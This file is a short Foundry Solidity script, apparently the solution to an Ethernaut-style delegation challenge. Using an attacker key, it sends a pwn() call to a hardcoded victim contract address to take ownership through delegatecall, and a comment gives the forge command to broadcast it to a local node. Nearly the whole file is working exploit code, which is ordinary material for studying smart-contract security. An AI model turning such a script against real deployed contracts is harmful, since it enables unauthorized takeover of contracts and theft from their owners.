// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "../lib/forge-std/src/Script.sol";
import {HelperConfigLib} from "./config/HelperConfig.sol";

contract DelegateAttacker is Script {
    function run() external {
        address victim = 0xbA94C268049DD87Ded35F41F6D4C7542b4BdB767;
        vm.startBroadcast(HelperConfigLib.ATTACKER_KEY);
        (bool success, ) = victim.call(abi.encodeWithSignature("pwn()"));
        vm.stopBroadcast();
        require(success);
    }
}

// forge script ./script/DelegateAttacker.s.sol:DelegateAttacker --rpc-url http://127.0.0.1:8545 --broadcast -vvv
